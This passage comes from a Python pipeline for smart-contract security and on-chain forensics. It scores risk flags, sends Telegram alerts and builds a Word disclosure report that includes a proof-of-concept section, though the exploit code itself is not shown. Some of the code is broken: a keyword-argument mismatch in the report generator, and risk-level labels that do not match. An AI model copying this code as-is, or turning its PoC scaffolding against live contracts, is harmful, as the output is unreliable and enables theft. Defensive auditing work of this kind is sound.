                flags.append({"id":"p6","text":"Deployer and attacker share funding source — insider link",
                               "severity":"CRITICAL","phase":"Post-Exploit Laundering Signals",
                               "evidence":{"deployer":deployer,"attacker":attacker,
                                           "shared_funders":list(shared)}})
    return flags


def calculate_risk(flags):
    phase_totals = {}
    for f in flags:
        phase = f.get("phase","Unknown")
        phase_totals[phase] = phase_totals.get(phase,0) + SEVERITY_SCORES.get(f.get("severity","MEDIUM"),1)
    score = 0
    for phase, weight in PHASE_WEIGHTS.items():
        raw  = phase_totals.get(phase, 0)
        norm = min(raw / (3 * 8), 1.0)
        score += norm * weight
    score = min(round(score), 100)
    level = ("CRITICAL RISK" if score >= 70 else "HIGH RISK" if score >= 40
             else "MEDIUM RISK" if score >= 20 else "LOW RISK")
    return score, level


def run_forensic_scan(address, chain_name, case_id, w3):
    """Run all 4 forensic phases and return report dict."""
    flags = []
    flags += phase1_wallet_recon(w3, chain_name, address)
    flags += phase2_contract_vulns(chain_name, address)
    flags += phase3_onchain_anomalies(w3, chain_name, address)
    flags += phase4_laundering(chain_name, address)

    phase1_enrich = run_phase1_enrichment(address)
    phase2_enrich = run_phase2_enrichment(address, "", chain_name)
    enrich_bonus = score_phase1_enrichment(phase1_enrich) + score_phase2_enrichment(phase2_enrich)
    score, level = calculate_risk(flags)
    score = min(score + enrich_bonus, 100)
    level = "CRITICAL" if score >= 70 else "HIGH" if score >= 40 else "MEDIUM" if score >= 20 else "LOW RISK"
    critical = [f for f in flags if f.get("severity") == "CRITICAL"]

    report = {
        "case_id": case_id, "contract_address": address,
        "chain": chain_name,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "risk_score": score, "risk_level": level,
        "total_flags": len(flags), "critical_flags": len(critical),
        "flagged_items": flags,
        "generated_by": "NanoJS Investigations Master v1.0",
        "github": "github.com/NanoJS10",
        "contact": "nanojs@proton.me",
    }

    out = OUTPUT_DIR / f"{case_id}_detection_report.json"
    with open(out, "w") as f:
        json.dump(report, f, indent=2)
    log.info(f"💾 Forensic report saved → {out}")
    return report


# ═════════════════════════════════════════════════════════════════════════════
# PART 3 — TELEGRAM ALERTS
# ═════════════════════════════════════════════════════════════════════════════

RISK_EMOJI = {"CRITICAL RISK":"🚨","HIGH RISK":"⚠️","MEDIUM RISK":"⚡","LOW RISK":"✅"}
SEV_EMOJI  = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡"}


def send_telegram_alert(report):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        log.warning("Telegram not configured — skipping alert.")
        return
    if report["risk_score"] < ALERT_THRESHOLD:
        log.info(f"Score {report['risk_score']} below threshold — no alert.")
        return

    risk_emoji = RISK_EMOJI.get(report["risk_level"], "⚠️")
    crits = [f for f in report["flagged_items"] if f.get("severity")=="CRITICAL"]
    highs = [f for f in report["flagged_items"] if f.get("severity")=="HIGH"]

    lines = [
        f"{risk_emoji} *NanoJS Forensic Alert*",
        f"",
        f"📁 Case     : `{report['case_id']}`",
        f"📄 Contract : `{report['contract_address']}`",
        f"⛓ Chain    : {report['chain']}",
        f"",
        f"📊 *Score: {report['risk_score']}/100 — {report['risk_level']}*",
        f"🚩 Flags   : {report['total_flags']} total | {report['critical_flags']} critical",
    ]
    if crits:
        lines += ["", "*🔴 CRITICAL:*"]
        for item in crits[:6]:
            lines.append(f"  • [{item.get('phase','?')[:18]}] {item['text']}")
    if highs:
        lines += ["", f"*🟠 HIGH ({len(highs)}):*"]
        for item in highs[:4]:
            lines.append(f"  • {item['text']}")
    lines += ["", "_NanoJS Investigations · github.com/NanoJS10_"]

    try:
        r = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": "\n".join(lines), "parse_mode": "Markdown"},
            timeout=10
        )
        r.raise_for_status()
        log.info(f"✅ Telegram alert sent — {report['case_id']}")
    except Exception as e:
        log.error(f"❌ Telegram failed: {e}")


def write_forensic_log(report):
    log_path = FORENSIC_DIR / f"{report['case_id']}_forensic.log"
    entry = {
        "logged_at": datetime.utcnow().isoformat(),
        "case_id": report["case_id"],
        "contract": report["contract_address"],
        "risk_score": report["risk_score"],
        "risk_level": report["risk_level"],
        "total_flags": report["total_flags"],
        "critical_count": report["critical_flags"],
        "critical_items": [f["text"] for f in report["flagged_items"] if f.get("severity")=="CRITICAL"],
    }
    with open(log_path, "a") as f:
        f.write(json.dumps(entry) + "\n")
    log.info(f"📝 Forensic log → {log_path}")


# ═════════════════════════════════════════════════════════════════════════════
# PART 4 — WORD REPORT GENERATOR
# ═════════════════════════════════════════════════════════════════════════════

NAVY      = RGBColor(0x0A,0x1F,0x44)
ACCENT    = RGBColor(0x00,0x82,0xCA)
WHITE     = RGBColor(0xFF,0xFF,0xFF)
DGRAY     = RGBColor(0x33,0x33,0x33)
RED       = RGBColor(0xC0,0x39,0x2B)
SEV_COLORS= {"CRITICAL":"C0392B","HIGH":"E67E22","MEDIUM":"F39C12","LOW":"27AE60"}


def _set_bg(cell, hex_color):
    tc=cell._tc; p=tc.get_or_add_tcPr(); s=OxmlElement("w:shd")
    s.set(qn("w:val"),"clear"); s.set(qn("w:color"),"auto"); s.set(qn("w:fill"),hex_color); p.append(s)

def _rule(doc, color="0082CA", sz=6):
    p=doc.add_paragraph(); pp=p._p.get_or_add_pPr(); pb=OxmlElement("w:pBdr")
    b=OxmlElement("w:bottom"); b.set(qn("w:val"),"single"); b.set(qn("w:sz"),str(sz))
    b.set(qn("w:space"),"1"); b.set(qn("w:color"),color); pb.append(b); pp.append(pb)
    p.paragraph_format.space_after=p.paragraph_format.space_before=Pt(2)

def _h(doc, text, lv=1):
    p=doc.add_paragraph(); r=p.add_run(text)
    r.font.size=Pt({1:18,2:13,3:11}.get(lv,11)); r.font.bold=True
    r.font.color.rgb={1:NAVY,2:ACCENT,3:DGRAY}.get(lv,DGRAY)
    p.paragraph_format.space_before=Pt({1:18,2:12,3:8}.get(lv,8))
    p.paragraph_format.space_after=Pt(4)
    if lv==1: _rule(doc)

def _body(doc, text, italic=False, color=None):
    p=doc.add_paragraph(); r=p.add_run(text)
    r.font.size=Pt(10); r.font.italic=italic
    if color: r.font.color.rgb=color
    p.paragraph_format.space_after=Pt(4)

def _itbl(doc, rows):
    t=doc.add_table(rows=len(rows),cols=2); t.style="Table Grid"
    for i,(k,v) in enumerate(rows):
        kc=t.rows[i].cells[0]; vc=t.rows[i].cells[1]
        _set_bg(kc,"0A1F44"); _set_bg(vc,"F4F6F8")
        kr=kc.paragraphs[0].add_run(k); kr.font.bold=True; kr.font.color.rgb=WHITE; kr.font.size=Pt(9); kc.width=Inches(2.0)
        vr=vc.paragraphs[0].add_run(str(v)); vr.font.size=Pt(9); vr.font.color.rgb=DGRAY; vc.width=Inches(4.5)
    doc.add_paragraph()

def _code(doc, code, maxl=60):
    lines=code.strip().split("\n")[:maxl]; t=doc.add_table(rows=1,cols=1); t.style="Table Grid"
    cell=t.rows[0].cells[0]; _set_bg(cell,"F0F0F0"); cell.paragraphs[0]._element.clear()
    for line in lines:
        p=cell.add_paragraph(); r=p.add_run(line if line else " ")
        r.font.name="Courier New"; r.font.size=Pt(8); r.font.color.rgb=DGRAY
        p.paragraph_format.space_after=p.paragraph_format.space_before=Pt(0)
    doc.add_paragraph()

def _badge(doc, sev):
    color=SEV_COLORS.get(sev,"999999"); p=doc.add_paragraph(); r=p.add_run(f"  {sev}  ")
    r.font.bold=True; r.font.size=Pt(10); r.font.color.rgb=WHITE
    rp=r._r.get_or_add_rPr(); s=OxmlElement("w:shd")
    s.set(qn("w:val"),"clear"); s.set(qn("w:color"),"auto"); s.set(qn("w:fill"),color); rp.append(s)
    p.paragraph_format.space_after=Pt(6)

REMEDIATIONS = {
    "REENTRANCY":       "Apply CEI pattern. Update state BEFORE external calls. Use OpenZeppelin ReentrancyGuard.",
    "FLASH_LOAN":       "Use TWAP oracle (Uniswap V3 or Chainlink). Never use balanceOf(address(this)) for pricing.",
    "ACCESS_CONTROL":   "Add onlyOwner or AccessControl to all privileged functions.",
    "UNPROTECTED_INIT": "Use OpenZeppelin initializer modifier. Add _disableInitializers() in constructor.",
    "SELFDESTRUCT":     "Remove or gate selfdestruct behind multi-sig/timelock.",
    "TX_ORIGIN":        "Replace tx.origin with msg.sender for all authentication checks.",
    "ARBITRARY_CALL":   "Whitelist allowed call targets. Never pass user-controlled calldata to external calls.",
    "SELFDESTRUCT_BYTECODE": "Verify source code and review selfdestruct access control.",
    "DANGEROUS_FUNCTIONS":   "Verify source code. Review access control on all privileged functions.",
}


def generate_word_report(vuln_results, forensic_report=None):
    """Generate complete Word report combining vuln findings and forensic data."""
    doc = Document()
    for s in doc.sections:
        s.top_margin=s.bottom_margin=s.left_margin=s.right_margin=Inches(1)
    doc.styles["Normal"].font.name="Arial"
    doc.styles["Normal"].font.size=Pt(10)

    date_str  = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    all_finds = [f for r in vuln_results for f in r["findings"]] if vuln_results else []
    chains    = list({r["contract"]["chain"] for r in vuln_results}) if vuln_results else []
    report_id = f"NanoJS-{datetime.utcnow().strftime('%Y%m%d-%H%M')}"

    # Cover page
    _rule(doc,"0082CA",18); doc.add_paragraph()
    p=doc.add_paragraph(); r=p.add_run("SMART CONTRACT SECURITY REPORT\nNanoJS Investigations")
    r.font.size=Pt(22); r.font.bold=True; r.font.color.rgb=NAVY; p.alignment=WD_ALIGN_PARAGRAPH.CENTER
    doc.add_paragraph()
    p2=doc.add_paragraph(); r2=p2.add_run("Responsible Disclosure — Vulnerability & Forensic Analysis")
    r2.font.size=Pt(11); r2.font.italic=True; r2.font.color.rgb=ACCENT; p2.alignment=WD_ALIGN_PARAGRAPH.CENTER
    doc.add_paragraph(); _rule(doc,"C0392B",6); doc.add_paragraph()

    meta_rows = [
        ("Report ID",    report_id),
        ("Investigator", "NanoJS (NanoJS Investigations)"),
        ("Contact",      "nanojs@proton.me | github.com/NanoJS10"),
        ("Date",         date_str),
        ("Chain(s)",     ", ".join(chains) if chains else "N/A"),
        ("Contracts",    str(len(vuln_results)) if vuln_results else "0"),
        ("Vuln Findings",str(len(all_finds))),
    ]
    if forensic_report:
        meta_rows += [
            ("Case ID",      forensic_report["case_id"]),
            ("Risk Score",   f"{forensic_report['risk_score']}/100 — {forensic_report['risk_level']}"),
            ("Forensic Flags",str(forensic_report["total_flags"])),
        ]
    meta_rows.append(("Classification", "CONFIDENTIAL — FOR PROJECT TEAM ONLY"))
    _itbl(doc, meta_rows); doc.add_page_break()

    # Vuln findings section
    if vuln_results and all_finds:
        _h(doc,"1. Vulnerability Findings",1)
        counts={"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0}
        for f in all_finds: counts[f["severity"]]=counts.get(f["severity"],0)+1
        _body(doc,f"Analysed {len(vuln_results)} contract(s). Found {len(all_finds)} vulnerability finding(s).")
        _h(doc,"Summary",2)
        st=doc.add_table(rows=5,cols=3); st.style="Table Grid"
        for i,h in enumerate(["Severity","Count","Risk"]):
            c=st.rows[0].cells[i]; _set_bg(c,"0A1F44")
            r=c.paragraphs[0].add_run(h); r.font.bold=True; r.font.color.rgb=WHITE; r.font.size=Pt(9)
        for i,(sev,cnt,imp) in enumerate([
            ("CRITICAL",counts["CRITICAL"],"Immediate fund loss"),
            ("HIGH",counts["HIGH"],"Significant risk"),
            ("MEDIUM",counts["MEDIUM"],"Conditional exploit"),
            ("LOW",counts["LOW"],"Best practice"),
        ]):
            row=st.rows[i+1]; _set_bg(row.cells[0],SEV_COLORS[sev])
            _set_bg(row.cells[1],"F4F6F8"); _set_bg(row.cells[2],"F4F6F8")
            r0=row.cells[0].paragraphs[0].add_run(sev); r0.font.bold=True; r0.font.color.rgb=WHITE; r0.font.size=Pt(9)
            row.cells[1].paragraphs[0].add_run(str(cnt)).font.size=Pt(9)
            row.cells[2].paragraphs[0].add_run(imp).font.size=Pt(9)
        doc.add_paragraph()

        fnum=1
        for result in vuln_results:
            contract=result["contract"]
            _h(doc,f"Contract: {contract['contract_address']}",2)
            _itbl(doc,[("Chain",contract["chain"]),("Address",contract["contract_address"]),
                        ("Name",contract.get("contract_name","Unknown")),
                        ("Source","Verified ✓" if result["source_available"] else "Bytecode only"),
                        ("Explorer",contract["explorer_url"])])
            for f in result["findings"]:
                _h(doc,f"Finding {fnum:02d} — {f['name']}",3)
                _badge(doc,f["severity"])
                _itbl(doc,[("Severity",f["severity"]),("Confidence",f"{f['confidence']}%"),
                            ("CWE",f["cwe"]),("Reference",f["reference"])])
                _h(doc,"Description",3); _body(doc,f["description"])
                _h(doc,"Evidence",3)
                for ev in f["evidence"]:
                    p=doc.add_paragraph(style="List Bullet"); p.add_run(ev).font.size=Pt(9)
                _h(doc,"Remediation",3)
                _body(doc,REMEDIATIONS.get(f["vuln_id"],"Review and apply appropriate access controls."))
                doc.add_paragraph(); fnum+=1

        # PoC section
        _h(doc,"2. Proof-of-Concept Prototypes",1)
        _body(doc,"Prototypes for responsible disclosure only. Do NOT deploy on mainnet.",italic=True,color=RED)
        doc.add_paragraph()
        pnum=1
        for result in vuln_results:
            for vid,poc in result["pocs"].items():
                f=next((x for x in result["findings"] if x["vuln_id"]==vid),{})
                _h(doc,f"PoC {pnum:02d} — {f.get('name',vid)}",2)
                _itbl(doc,[("Target",result["contract"]["contract_address"]),
                            ("Chain",result["contract"]["chain"]),
                            ("Severity",f.get("severity","N/A"))])
                _code(doc,poc,max_lines=60); pnum+=1

    # Forensic section
    if forensic_report and forensic_report["total_flags"] > 0:
        _h(doc,"3. Forensic Investigation Findings",1)
        _itbl(doc,[
            ("Case ID",forensic_report["case_id"]),
            ("Risk Score",f"{forensic_report['risk_score']}/100"),
            ("Risk Level",forensic_report["risk_level"]),
            ("Total Flags",str(forensic_report["total_flags"])),
            ("Critical Flags",str(forensic_report["critical_flags"])),
        ])
        for phase in ["Wallet Recon & Funding Chain","Contract Vulnerability Signals",
                      "On-Chain Anomaly Detection","Post-Exploit Laundering Signals"]:
            items=[f for f in forensic_report["flagged_items"] if f.get("phase")==phase]
            if items:
                _h(doc,phase,2)
                for item in items:
                    _badge(doc,item["severity"])
                    _body(doc,item["text"])
                    if item.get("evidence"):
                        for k,v in item["evidence"].items():
                            p=doc.add_paragraph(style="List Bullet")
                            p.add_run(f"{k}: {v}").font.size=Pt(9)
                    doc.add_paragraph()

    # Disclosure timeline
    _h(doc,"4. Disclosure Timeline",1)
    today=datetime.utcnow().strftime("%Y-%m-%d")
    tl=[
        (today,"Discovery and scan completed"),
        ("Within 24h","Report delivered to project team"),
        ("Day 3","Acknowledgement requested"),
        ("Day 14","Fix or mitigation confirmation"),
        ("Day 90","Public disclosure if no response"),
    ]
    tt=doc.add_table(rows=len(tl)+1,cols=2); tt.style="Table Grid"
    for i,h in enumerate(["Milestone","Action"]):
        c=tt.rows[0].cells[i]; _set_bg(c,"0A1F44")
        r=c.paragraphs[0].add_run(h); r.font.bold=True; r.font.color.rgb=WHITE; r.font.size=Pt(9)
    for i,(d,a) in enumerate(tl):
        row=tt.rows[i+1]; bg="F4F6F8" if i%2==0 else "FFFFFF"
        _set_bg(row.cells[0],bg); _set_bg(row.cells[1],bg)
        row.cells[0].paragraphs[0].add_run(d).font.size=Pt(9)
        row.cells[1].paragraphs[0].add_run(a).font.size=Pt(9)
    doc.add_paragraph()

    # Signature
    _h(doc,"5. Investigator Statement",1)
    _body(doc,"This report was produced independently by NanoJS Investigations as part of an ongoing "
             "responsible disclosure research programme. No financial compensation was received prior "
             "to this disclosure. All findings are based on publicly accessible on-chain data.")
    doc.add_paragraph(); _rule(doc,"0082CA",6); doc.add_paragraph()
    _itbl(doc,[("Handle","NanoJS / NanoJS10"),("Organisation","NanoJS Investigations"),
               ("Email","nanojs@proton.me"),("GitHub","github.com/NanoJS10"),
               ("Portfolio","waliusoji.github.io"),("Generated",date_str)])
    p=doc.add_paragraph(); r=p.add_run('"Data on the blockchain is permanent — analysis makes it powerful."')
    r.font.italic=True; r.font.color.rgb=ACCENT

    out=f"NanoJS-{datetime.utcnow().strftime('%Y%m%d-%H%M')}_Disclosure_Report.docx"
    doc.save(out)
    log.info(f"✅ Word report saved: {out}")
    return out


# ═════════════════════════════════════════════════════════════════════════════
# MAIN PIPELINE
# ═════════════════════════════════════════════════════════════════════════════

def print_summary(vuln_results, forensic_report):
    sep = "═" * 60
    print(f"\n{sep}")
    print(f"  NanoJS SCAN COMPLETE")
    print(sep)
    if vuln_results:
        all_finds = [f for r in vuln_results for f in r["findings"]]
        print(f"  Vulnerability findings : {len(all_finds)}")
        for sev in ["CRITICAL","HIGH","MEDIUM"]:
            cnt = sum(1 for f in all_finds if f["severity"]==sev)
            if cnt: print(f"    {SEV_EMOJI.get(sev,'')} {sev}: {cnt}")
    if forensic_report:
        print(f"  Forensic score  : {forensic_report['risk_score']}/100 [{forensic_report['risk_level']}]")
        print(f"  Forensic flags  : {forensic_report['total_flags']} ({forensic_report['critical_flags']} critical)")
    print(sep + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="NanoJS Master Pipeline — Vulnerability + Forensic + Telegram + Word Report",
        epilog="Example: python3 nanojs_master.py --contract 0xABC... --chain Ethereum --case NanoJS04"
    )
    parser.add_argument("--contract", "-c", required=True, help="Contract address")
    parser.add_argument("--chain",    "-ch", default="Ethereum",
                        help=f"Chain: {', '.join(CHAINS.keys())}")
    parser.add_argument("--case",     "-n",  default=None, help="Case ID e.g. NanoJS04")
    parser.add_argument("--attacker", type=str, default=None, help="Known attacker wallet - forces clustering")
    parser.add_argument("--alert",    "-a",  action="store_true",
                        help="Send Telegram alert if risk score >= threshold")
    args = parser.parse_args()

    address = args.contract
    chain   = args.chain
    case_id = args.case or f"NanoJS-{datetime.utcnow().strftime('%Y%m%d%H%M')}"

    print(f"\n{'═'*60}")
    print(f"  NanoJS Master Pipeline")
    print(f"  Contract : {address}")
    print(f"  Chain    : {chain}")
    print(f"  Case ID  : {case_id}")
    print(f"{'═'*60}\n")

    cfg = CHAINS.get(chain)
    if not cfg:
        log.error(f"Unknown chain: {chain}. Options: {', '.join(CHAINS.keys())}")
        sys.exit(1)

    # Step 1 — Vulnerability scan
    log.info("▶ STEP 1: Vulnerability scan...")
    vuln_results = run_vuln_scan(address, chain)

    # Step 2 — Deep forensic scan
    log.info("▶ STEP 2: Deep forensic scan...")
    w3 = None
    forensic_report = None
    try:
        w3 = Web3(Web3.HTTPProvider(cfg["rpc"]))
        if w3.is_connected():
            address_cs = Web3.to_checksum_address(address)
            forensic_report = run_forensic_scan(address_cs, chain, case_id, w3)
        else:
            log.warning("RPC not connected — skipping forensic scan.")
    except Exception as e:
        log.warning(f"Forensic scan error: {e}")


    # Step 2.5 - Phase 5: Wallet Clustering
    cluster_results = {}
    if forensic_report and forensic_report.get("risk_score", 0) >= 10:
        log.info("Phase 5: Wallet clustering...")
        try:
            cluster_results = run_clustering_phase(
                seed_address=address,
                chain=chain,
                case_id=case_id,
                output_dir="reports",
                hop_depth=3,
            )
            log.info(f"    Wallets found : {cluster_results['wallet_count']}")
            log.info(f"    Mixer hits    : {cluster_results['mixer_hits']}")
            log.info(f"    Cross-chain   : {cluster_results['cross_chain']}")
        except Exception as e:
            log.warning(f"Wallet clustering failed: {e}")
    elif args.attacker if hasattr(args, "attacker") else False:
        log.info("Phase 5: Wallet clustering (attacker mode)...")
        try:
            cluster_results = run_clustering_phase(
                seed_address=args.attacker,
                chain=chain,
                case_id=case_id,
                output_dir="reports",
                hop_depth=3,
            )
            log.info(f"    Wallets found : {cluster_results['wallet_count']}")
            log.info(f"    Mixer hits    : {cluster_results['mixer_hits']}")
            log.info(f"    Cross-chain   : {cluster_results['cross_chain']}")
        except Exception as e:
            log.warning(f"Attacker clustering failed: {e}")
    else:
        log.info("Phase 5: Clustering skipped (score below threshold)")

    # Step 3 — Word report
    log.info("▶ STEP 3: Generating Word report...")
    report_path = generate_word_report(vuln_results, forensic_report)

    # Step 4 — Telegram alert
    if args.alert and forensic_report:
        log.info("▶ STEP 4: Sending Telegram alert...")
        write_forensic_log(forensic_report)
        send_telegram_alert(forensic_report)
    elif forensic_report:
        write_forensic_log(forensic_report)

    # Summary
    print_summary(vuln_results, forensic_report)
    print(f"  Word report  : {report_path}")
    if forensic_report:
        print(f"  JSON report  : reports/{case_id}_detection_report.json")
    print(f"  Forensic log : forensic_logs/{case_id}_forensic.log\n")
    if cluster_results:
        print(f"  Cluster report: reports/{case_id}_cluster_*.json")
        print(f"  Wallets found : {cluster_results['wallet_count']}")
        print(f"  Mixer hits    : {cluster_results['mixer_hits']}")



if __name__ == "__main__":
    main()
